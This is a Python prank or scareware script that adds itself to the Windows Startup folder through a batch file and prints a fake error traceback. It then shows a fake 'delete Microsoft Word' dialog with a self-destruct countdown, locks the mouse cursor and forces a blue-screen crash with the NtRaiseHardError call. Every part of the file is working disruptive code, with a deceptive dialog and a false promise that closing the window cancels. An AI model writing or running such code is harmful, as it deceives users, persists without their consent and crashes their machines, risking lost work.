import mouse
import tkinter as tk
import time
import threading
import playsound as ps
import getpass
import os
import ctypes
USER_NAME = getpass.getuser()
check = ""
deletion = False
def startupcheck():
    curr = os.path.abspath(os.getcwd())
    check = os.path.isfile(r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msi.bat' % USER_NAME)
    if check == True:
        started()
        deletion = True
    else:
        add_to_startup()
        print("Traceback (most recent call last):\nFile C:\\Users\\windows\\Desktop,\nline 6, in <module>txt.grid(column = 0, row = 0, font=(Anurati Regular, 50)\n")
        input("Press enter to exit\n")
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
    with open(bat_path + '\\' + "msi.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s\funny.py"' % file_path)
def started():
    #definitions
    def crasher():
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            print("BSOD Successfull!")
        else:
            print("BSOD Failed...")
    def countdown():
        defval.set("Windows self-destruction initiated")
        delval.set("Exit the window to cancel")
        timeval = 10
        count = 10
        while (count > 0):
            timeval = timeval - 1
            val.set(timeval)
            count = count - 1
            time.sleep(1)
            if count == 0:
                crasher()
    def playsoundd():
        file_path = os.path.dirname(os.path.realpath(__file__))
        ps.playsound(r'%s\funi.wav' % file_path)
    def blockcurs():
        loc = mouse.get_position()
        xc = loc[0]
        yc = loc[1]
        while True:
            mouse.move(xc,yc,absolute=True,duration=0.2)
    #threading
    def threadinginit():
        x = threading.Thread(target=countdown)
        y = threading.Thread(target=playsoundd)
        z = threading.Thread(target=blockcurs)
        x.start()
        y.start()
        z.start() 
    #m window init
    m = tk.Tk()
    #variables
    val = tk.StringVar()
    defval = tk.StringVar()
    delval = tk.StringVar()
    defval.set("Do you want to delete Microsoft Word?")
    #windowconfig
    m.resizable(False,False)
    m.geometry('545x500')
    #actual code
    tk.Label(m,textvariable=defval,font=('',24),fg="Red").pack()
    tk.Label(m, textvariable=delval,font=('',20)).pack()
    tk.Label(m, textvariable=val,font=('',120),pady=90).pack()
    tk.Button(m, text="Yes",width=20,padx=10,command=threadinginit).pack(side=tk.RIGHT)
    f = tk.Button(m, text="No",command=threadinginit,width=20,padx=10).pack(side=tk.LEFT)
    #end
    m.mainloop()
    if deletion == True:
        os.remove('C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msi.bat' % USER_NAME)
    else:
        pass

startupcheck()
